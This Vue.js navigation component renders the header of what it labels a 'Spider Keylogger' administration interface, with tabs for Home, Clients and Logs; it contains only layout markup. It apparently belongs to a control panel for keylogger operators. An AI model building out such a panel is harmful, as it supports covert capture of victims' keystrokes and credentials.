<template>
  <section class="hero is-light is-medium">
    <div class="hero-head">
      <header class="nav">
        <div class="container">
          <div class="nav-left">
            <router-link to="/" class="nav-item">
              <img src="http://vector.me/files/images/2/3/23100/spyder.png" alt="Logo">
            </router-link>
          </div>
          <div class="nav-right nav-menu">
            <router-link to="/" activeClass="is-active" class="nav-item">
              Home
            </router-link>
          </div>
        </div>
      </header>
    </div>

    <div class="hero-body">
      <div class="container has-text-centered">
        <h1 class="title">
          Spider Keylogger
        </h1>
        <h2 class="subtitle">
          Administration Interface
        </h2>
      </div>
    </div>

    <div class="hero-foot">
      <nav class="tabs is-boxed is-fullwidth">
        <div class="container">
          <ul>
            <router-link :to="{name: 'home'}" tag="li" activeClass="is-active" exact>
              <a>Home</a>
            </router-link>
            <router-link :to="{name: 'client'}" tag="li" activeClass="is-active">
              <a>Clients</a>
            </router-link>
            <router-link :to="{name: 'logs'}" tag="li" activeClass="is-active">
              <a>Logs</a>
            </router-link>
          </ul>
        </div>
      </nav>
    </div>
  </section>
</template>

<script>
  export default {
    name: 'navigation'
  }
</script>

<!-- Add "scoped" attribute to limit CSS to this component only -->
<style scoped>
</style>
